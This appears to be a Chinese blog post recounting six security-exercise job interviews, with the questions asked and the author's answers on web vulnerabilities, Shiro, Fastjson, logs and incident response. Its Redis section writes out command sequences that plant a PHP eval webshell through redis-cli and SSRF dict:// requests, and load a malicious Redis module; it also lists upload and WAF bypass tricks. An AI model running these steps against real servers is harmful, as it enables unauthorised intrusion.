# 原创
：  6次hvv面试经验分享-你确定不进来看看？

# 6次hvv面试经验分享-你确定不进来看看？

### 第一次：

ny*中介面：

1、sql注入的分类、原理、和防御方式
1.  `1. 原理：` 1.  `用户输入的数据未经过处理直接传到服务器经数据库解析并且直接返回结果。` 1.  `2. 防御方式：` 1.  `预编译、添加过滤条件，使用一些自带的类或者安全接口，比如：jsp中的peparstatement，可以将用户输入的参数转到sql语句时做一道处理。将参数值全部转化为’?’和set赋值的方式。以此避免注入。` 1.  `3. 分类：` 1.  `sql注入从传参形式来讲分为get、post注入。细分可以看作Cookie、header等。从方式上来讲可以分为显错注入、盲注、报错注入。从数据库方面来讲可以分为access偏移注入，DNS注入。` 1.   1.  `显错注入：` 1.  `用户输入的数据经过处理直接回显到页面上，比如：使用传参id时，无论是经过1+1或者order by之类可以看到直观回显信息的操作还是union select导致页面上的占位符回显数据库执行结果，都为显错。` 1.   1.  `盲注：` 1.  `页面只给出true或者false也就是正常或者不正常两种回应时，可以使用length、substr、if、ascii这四个函数再加上burp的爆破来逐字符的判断是否与数据库执行结果相对应。` 1.   1.  `时间盲注：` 1.  `页面回显单一时可使用sleep函数来进行时间的判断，如果sleep函数被过滤，可以使用benchmark替代，这个函数可以控制某函数运行的时间，使用与判断拼接select 1或者selectversion来查看函数运行时间与执行结果是否对应。` 1.  `报错注入：` 1.  `sql注入时，页面报错且附带报错信息时可以使用，比如：updatexml，floor跟exp等等。主要利用方式比如updatexml，第一个参数为xml内容，可随意，第二个为update的为主xpath路径，第三个参数为更新后的内容，不符合xpath的内容会被报错处理且进行解析，那么如果将第二个参数替代为sql语句。就能够在报错页面的到报错且已运行的查询结果` 
2、CSRF和SSRF的区别：
1.  `CSRF：` 1.  `客户端请求伪造。用户请求的数据被当作可信任用户直接执行。` 1.  `原理：` 1.  `浏览器对于js的信任，或者说对于已登录用户操作的信任。用户在登录网站后会生成一个cookie，再未退出或者未执行删除cookie之前，都会保留。那么在同一时间，如果用户点击了网站上攻击者恶意构造的代码，比如：url/message=’hack’，由于浏览器对于用户的信任，会直接执行这行代码，以致于再用户不知道的情况下发了贴，如果把message换成其他的，比如password=，或者管理员的添加用户的payload，就可以达成相关操作。至于如何让信任用户点击这些链接，可以使用社工发送恶意链接、XSS的方式存储js代码，用户访问时则给出回应等` 1.  `SSRF：` 1.  `服务端请求伪造。用户输入的代码被服务器信任直接发送请求。用户在网页上请求服务器资源的时候使用了url=，imagesrc=来请求内网资源的时候，可以尝试修改url，或者说使用协议file、dict、gopher来探测端口存活，如果存活则回显bad REQUEST，如果不是，则直接空白。` 
3、XXE漏洞
1.  `XXE是针对解析XML输入的应用程序的一种攻击。 当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。 这种攻击可能导致信息泄露，命令执行，拒绝服务，SSRF，内网端口扫描以及其他系统影响。` 1.  `php相关函数有parsexml、simple_xml_loadfile` 1.  `重点：` 1.  `这里不得不去说明以下DTD：文档类型定义，简单来讲，就是申明变量。` 1.  `比如：或者` 1.  `实体类型一共分为：内置实体、字符实体、通用实体、参数实体（除了参数实体使用%申明和调用以外，其他的都是&amp;amp;）` 1.  `利用方式：` 1.  `如果服务器解析xml数据并且给出直观的回显，那么我们可以直接通过添加xml数据比如：file读取/etc/passwd文件看到相关数据` 1.  `如果解析但是不给回显，同时支持检测DTD外部引用实体，我们可以通过xml中添加主机ip发送请求后查看主机ip日志是否得到返回数据，或者干脆使用DNSlog` 1.  `基于SSRF的XXE，可以通过http协议进行探测` 
4、知道有哪些中间件漏洞嘛？
1.  `Tomcat：` 1.  `war包后门` 1.  `远程代码执行` 1.  `* session反序列化` 1.  `Nginx：` 1.  `解析漏洞1.jpg/.php` 1.  `目录穿越` 1.  `JBoss：` 1.  `反序列化` 1.  `IIS：` 1.  `解析漏洞 xxx.jasp/1.jpg` 1.  `路径穿越` 1.  `远程代码执行` 1.  `Apache：` 1.  `解析漏洞 1.php%0a换行解析 1.php.xx未知后缀解析` 1.  `目录穿越` 1.  `Weblogic：` 1.  `反序列化` 1.  `Ssrf任意文件上传` 
5、给你一个恶意样本如何溯源？
1.  `第一步：丢到虚拟机进行运行或者分析` 1.  `第二步：可以使用逆向工具进行解码分析如果不会逆向可以抓包查看恶意样本中的ip，哪个ip用于接收从服务器返回的数据。` 
6、应急响应
1.  `服务器被上传了一个木马怎么办?` 1.  `- 使用D盾或者河马进行扫描` 1.  `- 如果没有，可以尝试在日志/var/log/message下查找上传文件的日志记录，命令：find var/log/message | awk 正则匹配一下php文件或者asp文件。（其实后面的我忘了怎么写，不过知道大概原理即可）` 1.  `- 接下来就是杀木马，找后门，恢复快照。` 
##### 结果：通过

### 第二次：

北**qa*一面：

sql注入的分类：
1.  `上面有` 
linux基础命令（他在里面挑了几个，常用的我直接全写了）：
1.  `1、查看文件：` 1.  `(1)Cat 文件名（不适用大文件）` 1.  `(2)Tac 文件名（反过来看）` 1.  `(3)More 文件名（分页显示文件内容）` 1.  `(4)Less 文件名（分页显示文件内容、且可以滚动）` 1.  `(5)Head -n 5 文件名（从头开始查看文件前五行）` 1.  `(6)Tail -n 5 文件名（从尾开始查看文件后五行）` 1.  `2、编辑文件：` 1.  `(1)Vim` 1.  `(2)Vi` 1.  `(3)Nano` 1.  `3、查找文件：` 1.  `(1)Find` 1.  `(2)Locate` 1.  `(3)Whereis` 1.  `(4)Which` 1.  `4、查看文件信息` 1.  `(1)Ls` 1.  `(2)Stat` 1.  `(3)File` 1.  `5、查看进程` 1.  `(1)Ps` 1.  `(2)Pstree` 1.  `(3)Top` 1.  `6、结束进程` 1.  `(1)kill -pid` 1.  `(2)ps -ef | grep 进程名` 1.  `(3)kill -l pid` 1.  `(4)killall` 1.  `(5)输入命令gnome-system-monitor调出任务管理器手动关闭进程` 
shrio反序列化的原理？
1.  `shrio550：` 1.  `原理：` 1.  `导致shiro反序列化的主要原因就是shiro提供的记住密码功能，当用户打开这个功能时会在请求包中生成一个cookie，cookie的value值是经过反序列-&amp;gt;aes加密-&amp;gt;base64加密后的字符串，关键在于aes加密的秘钥是默认的，如果没有修改这个秘钥，就会导致反序列化漏洞，攻击者可以构造恶意代码，将恶意代码序列化-aes加密-base64加密后传入cookie，这样就导致RCE漏洞。` 1.  `特征：` 1.  `shiro是一个身份验证组件，一般用在登录模块，登录失败会有一个失败标识rememberme=deleteme，如果返回包中存在该字段则说明可能存在反序列化漏洞。` 1.  `shrio721：` 1.  `不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的Remember。` 
文件上传的原理、防御以及绕过方式：
1.  `原理` 1.  `后端对于被上传文件的绝对信任，同时暴露自身在网页上的路径，使得被上传的恶意文件可以被访问的同时导致代码执行、命令执行等漏洞` 1.   1.  `防御` 1.  `黑白名单，对于文件内容进行处理，二次处理文件名，修改文件后缀，不允许访问被上次文件的链接地址等` 1.   1.  `绕过方式：` 1.  `前端验证绕过` 1.  `content-type绕过` 1.  `黑名单绕过，通过解析漏洞，比如：phtml、php2/3/4可解析为php` 1.  `后缀大小写绕过` 1.  `文件后缀空（点）绕过` 1.  `::$DATA WINDOWS文件流绕过` 1.  `%00截断绕过，%00表示字符串结尾` 1.  `图片马绕过` 1.  `条件竞争` 
##### 结果：通过

### 第三次：

ps*一面：
1.  `重复的就不写了，这里多问了设备还有一个日志位置` 
设备
1.  `天眼（有护网经验且用过问的就细一点，没有基本上就问用没用过）` 1.   1.  `分组，子查询：用户控制查询中的逻辑，将多个条件组合起来` 1.  `示例：` 1.  `host:"baidu.com" AND (dport:80 OR uri:"login")` 1.  `sip:("10.0.0.1" OR "10.0.0.2" OR "10.0.0.3") AND dip:"10.0.0.4"` 1.  `sip:"10.1.1.1" AND dip:"10.1.1.2" AND status:(200) ` 1.   1.  `10.1.1.1访问服务器10.1.1.2状态码为200的流量日志` 1.  `dport:"443" OR dport:"8080` 1.   1.  `访问端口是443或者8080的流量日志` 1.  `dport:"80" NOT host:"www.example.com"` 1.   1.  `访问端口为80，排除访问www.example.com域名的流量日志` 1.  `dip:"10.1.1.2" AND client_os:"windows7"` 1.   1.  `服务器ip为10.1.1.2,操作系统为windows7的流量日志` 1.  `_exists_:attachment：返回结果中必须存在 attachment` 1.  `_missing_:attachment：不能含有 attachment` 1.   1.  `处置方案：` 1.  `传感器上出现sql注入告警后` 1.  `1、验证此条sql注入告警是否真的存在sql注入漏洞` 1.  `2、通过请求数据包判断触发告警的行为是客户自身还是攻击行为` 1.  `3、若为自身业务问题，则将漏洞点相关整合成报告反馈客户` 1.  `4若为攻击者行为，需要进一步分析，查看分析平台攻击ip除了sql注入外是否有其他攻击行为，攻击的结果如何` 1.  `5、将发现时间及攻击行为反馈给护网客户` 1.  `传感器上出现RCE告警` 1.  `1、验证此条警告师傅真的成功（若成功直接出报告）` 1.  `2、若失败，判断攻击者是手工还是工具批量扫描行为` 1.  `3、进入分析平台进一步分析，查看分析平台攻击ip除了rce是否有其他攻击行为，攻击结果如何` 1.  `4、将发现时间及攻击行为反馈给护网` 
日志位置：
1.  `/var/log/secrue 登录日志` 1.  `/var/log/message系统日志` 1.  `/var/log/maillog 邮件日志` 1.  `/var/log/cron 计划任务日志` 1.  `/var/log/httpd apache日志` 1.  `/var/log/mysql mysql日志` 
##### 结果：通过

### 第四次：厂商面

#### 第一家：

c*：<br/> 1、自我介绍
1.  `学习这一行多久了、在校的时候有什么经历，拿过什么证书（这个可以写在简历里面）比如：比赛、hvv、渗透测试项目。` 
2、XXE
1.  `（第25行）` 
3、CSRF和SSRF
1.  `（第18行）` 
4、redis的几种rce手段？
1.  `1、写SSH公钥` 1.  `条件：服务器存在.ssh目录且具有写入的权限` 1.  `原理：` 1.  `在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key。` 1.  `2、写webshell` 1.  `条件：已知web绝对路径。` 1.  `步骤：` 1.  `1. redis -cli -h 192.168.x.x 连接目标服务器` 1.  `2. config set dir "/var/www/html" 设置保存文件路径` 1.  `3. config set dbfilename shell.php 设置保存文件名` 1.  `4. set x "\n\n&lt;?php &lt;span class="label label-primary"&gt;@eval($_POST['cmd']);&lt;/span&gt; ?&amp;gt;\n" 将webshell写入x键值中` 1.  `5. save 保存` 1.  `3、主从复制` 1.  `原理：在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。` 1.  `利用流程：` 1.  `生成恶意.so文件，下载RedisModules-ExecuteCommand使用make编译即可生成。` 1.  `git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand` 1.  `cd RedisModules-ExecuteCommand/` 1.  `make` 1.  `攻击端执行： python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so` 
5、ssrf配合redis打rce？
1.  `利用手段：` 1.  `通过dict和gopher协议，前者探测，后者写入` 1.  `探测端口：` 1.  `ssrf.php?url=dict://x.x.x.x:$端口$ 利用burpsuite爆破端口` 1.  `探测是否设置弱口令：` 1.  `ssrf.php?url=dict://x.x.x.x:6379/info 已知端口利用info探测是否设置了密码` 1.  `爆破密码：` 1.  `ssrf.php?url=dict://x.x.x.x:6379/auth:$密码$ 利用burpsuite爆破密码` 1.  `写入webshell：` 1.  `1. url=dict://xxx.xxx:6379/config:set:dir:/var/www/html 切换文件目录` 1.  `2. url=dict://xxx.xxx:6379/config:set:dbfilename:webshell.php 设置保存文件名` 1.  `3. url=dict://xxx.xxx:6379/set:webshell:"\x3c\x3f\x70\x68\x70\x20\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x3f\x3e"` 1.  `//利用dict协议写入webshell 以上的字符编码是&lt;?php phpinfo();?&gt;的十六进制` 1.  `4. url=dict://x.x.x.x:6379/save 保存` 1.  `通过gopher写入webshell` 1.  `set x "\n\n\n&lt;?php &lt;span class="label label-primary"&gt;@eval($_POST['redis']);?&lt;/span&gt;&amp;gt;\n\n\n"` 1.  `config set dir /var/www/html` 1.  `config set dbfilename shell.php` 1.  `save` 1.  `两次url编码直接访问即可` 
6、菜刀、蚁剑、冰蝎、哥斯拉的流量特征？
1.  `菜刀：` 1.  `连接过程中使用base64编码对发送的指令进行加密，其中两个关键payload z1 和 z2，名字都是可变的。` 1.  `蚁剑：` 1.  `一般将payload进行分段，然后分别进行base64编码，一般具有像eval这样的关键字，然后呢大概率还有&lt;span&gt;@ini_set(&lt;/span&gt;"display","0");这种代码` 1.  `冰蝎：` 1.  `16个ua头` 1.  `请求包中的conten-length字段是5740或者5720` 1.  `哥斯拉：` 1.  `在响应包的cache-control字段中有no-store，no-cache等特征。` 1.  `三次响应连接` 
7、应急响应：
1.  `（第62行）` 
8、shiro知道攻击方式但是不知道利用链怎么办？
1.  `当时有点懵，最后问了一下别的师傅才知道，shrio attack有爆破利用链=.=，不过我感觉她不是想知道这个` 
##### 结果：通过

#### 第五次：boss上面找的一个中级=.=

1、fastjson不出网利用：
1.  `org.apache.tomcat.dbcp.dbcp2.BasicDataSource` 1.  `条件：BasicDataSource需要有dbcp或者tomcat-dbcp的依赖` 1.  `利用过程：使用BasicDataSource链，构造恶意类后将其的字节码转化为BCEL格式，其中driverClassName和driverClassLoader都是可控的，由用户输入，指定ClassLoader为com.sun.org.apache.bcel.internal.util.ClassLoader，设置ClassName为BCEL..这种格式，字啊newInstance方法执行后被实例化，第二个参数initial为true时，类加载后将会直接执行static{}块中的代码。` 
2、设备告警，你确定存在一个攻击，但是这个攻击没有任何回显响应甚至状态，你如何处理？
1.  `破防点+1` 1.  `问了别的师傅：可能被打了路由，并非页面` 
3、打过内网横向吗？
1.  `永恒之蓝打学校机房算不？` 1.  `不算` 1.  `之前拿到过一个站的阿里云的key，然后打了一波内网，但是没什么成绩` 1.  `那就是没做过？` 1.  `。。。。嗯` 1.  `破防点+2` 
4、知道是shiro攻击成功了，请判断这个shiro是通过什么方式攻击的？
1.  `（感觉自己好像知道，于是答了原理）` 1.  `不是，我是问你通过什么方式？` 1.  `恶意的cookie？` 1.  `（几秒沉默，跳过话题）` 
5、windows日志的敏感事件id知道吗？
1.  `敏感事件id：` 1.  `4624 登录成功` 1.  `4625 登录失败` 1.  `4672 使用超级管理员进行登录` 1.  `4720 创建用户` 1.  `（相关文件呢？）` 1.  `可疑账号：` 1.  `lusrmgr.msc` 1.  `登录日志：` 1.  `eventvwr.msc` 1.  `（总算答上来一个完整的，我当时感觉到这里估计已经降初级了）` 
6、冰蝎2.0、3.0、4.0的流量特征知道吗？
1.  `冰蝎2.0` 1.  `第一阶段请求中返回包的状态码是200，返回内容是16位的密钥。建立连接后的cookie格式都是Cookie：PHPSessid=xxxx ；path=/；特征。` 1.  `冰蝎3.0` 1.  `16个ua头` 1.  `请求包中的conten-length字段是5740或者5720` 1.  `冰蝎4.0` 1.  `弱特征：Content-type: Application/x-www-form-urlencoded` 1.  `冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右，每连接一次，每建立一次新的连接，端口就依次增加。` 1.  `流量特征` 1.  `$post=Decrypt(file_get_contents(“php://input”));` 1.  `eval($post);` 
7、用过哪些edr设备吗？
1.  `经历两次破防，已经混乱了` 1.  `给个参考链接吧，没用过的可以看深信服的主页edr视频` 1.  `https://edr.sangfor.com.cn/#/index/home` 
#### 结果：初级

### 第六次：厂商面（沈阳sl）

亚*：
1.  `重复的就不谈了` 
1、fastjson反序列化：
1.  `fastjson提供的反序列化功能允许用户传入json格式数据的时候通过&lt;span&gt;@type?&lt;/span&gt;??value值指定任意反序列化类名，同时会将反序列化的对象直接实例化且调用setter根getter方法。` 1.  `使用&lt;span&gt;@type?&lt;/span&gt;??value字段执行反序列化的类，例如JdbcRowSetImpl这个类，接着将这个类中的成员变量datasourcename的value值设为rmi远程加载类，这样fastjson在将传入的类反序列化、实例对象后，会通过成员变量传入的value值，请求rmi服务器，最后rmi返回远程类，fastjson执行这个远程恶意类。导致rce漏洞。` 1.  `特征：` 1.  `在请求包中查找json格式的字符串，重点在于rmi和一些出网操作` 
2、Weblogic反序列化：
1.  `原理：` 1.  `xml反序列化，这是wls security组件对外提供的webserver页面，通过xmlDecoder功能来解析用户的xml数据导致的任意字符串被当做代码去执行` 1.  `特征：` 1.  `服务器开放7001端口，传递xml数到wls-wsat，数据包内容有bash或者dnslog字段。` 
3、Struts2：
1.  `stu2-045：` 1.  `content-type值错误会导致JakartaMultiPartRequest类抛出异常且对错误信息进行ONGL表达式的解析，因此可以在POST数据传参中构造恶意代码同时使得content-type报错。` 1.  `stu2-061：` 1.  `根045唯一的区别就是单content-type可能被处理过了，我们只需要爆破所有参数即可` 1.  `stu2-057` 1.  `漏洞产生于网站配置XML时如果没有设置namespace的值，并且上层动作配置中并没有设置或使用通配符namespace时，可能会导致远程代码执行漏洞的发生。同样也可能因为url标签没有设置value和action的值，并且上层动作并没有设置或使用通配符namespace，从而导致远程代码执行漏洞的发生` 1.   1.  `利用条件` 1.  `alwaysSelectFullNamespace被设置为true，此时namespace的值是从URL中获取的。URL是可控的，所以namespace也是可控的。` 1.  `action元素没有名称空间属性集，或者使用通配符。该名称空间将由用户从URL传递并解析为OGNL表达式，最终导致远程代码执行的脆弱性` 
4、溯源
1.  `首先通过ip反查域名、whois查询公司、备案信息等等。如：查到域名未某博客，可以尝试查看作者信息，丢到社工库或者蓝队师傅群里问。` 1.  `如果域名无法正常访问，可以尝试google快照获取相关信息，如：博客无法访问，但是google快照发现历史文章，以此为入手处继续查看备案信息或者直接问。` 
5、误报的处理方式
1.  `看情况第一步判断是不是内部人员误操作，如果是，则需要考虑是否要添加某些规则进入白名单，如果并非内部人员操作，就需要对于设备告警发出的信息进行流量分析等，测试是否能对服务器造成危害，然后进行应急` 
6、webshell如何绕过waf
1.  `Webshell绕过waf：` 1.  `上传webshell的时候可以将木马改成实现方法或者实例化类传参的方式` 1.  `字符串拼接` 1.  `定义常量，用eval执行这个常量` 
##### 结果：通过

还有一次特别初级跟几次初级基本上都过了，初级的问题大致一样。盯死哪些反序列化、流量特征和linux命令就行。问了好几次日志

**收获：**
1.  `1、有护网经验跟没有护网经验的面试情况跟结果是两个不同的层次，懂得都懂` 1.  `2、简历要写的帅一点，自己挖过什么牛逼的漏洞都可以写进去` 1.  `3、千万别写那种自己本来就不大熟悉的知识点，面试官但凡问道你支支吾吾，好一点的终止这个问题，难办的细究能让你破防，还会影响你后面的面试` 1.  `4、多面几家，多面几家，多面几家，让自己能够淡然的面对一切问题，就算不会也能摆出：“这次不会，下次一定”的态度。` 1.  `5、初级大多是漏洞原理和一些应急方面的，部分厂商和中级会怼着内网或者设备问你情景题，比如wb就怼着流量特征` 
 申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
